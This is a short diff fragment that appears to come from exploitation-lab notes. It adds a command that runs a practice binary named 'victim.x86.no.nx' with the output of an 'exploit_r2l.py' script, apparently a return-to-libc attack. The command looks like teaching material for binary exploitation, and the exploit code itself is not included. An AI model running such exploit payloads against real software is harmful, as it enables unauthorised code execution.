@@ -51,4 +51,6 @@
 
     hexdump 0xf7f6ea0b 10
 
+    ./victim.x86.no.nx $(python exploit_r2l.py)
+
 
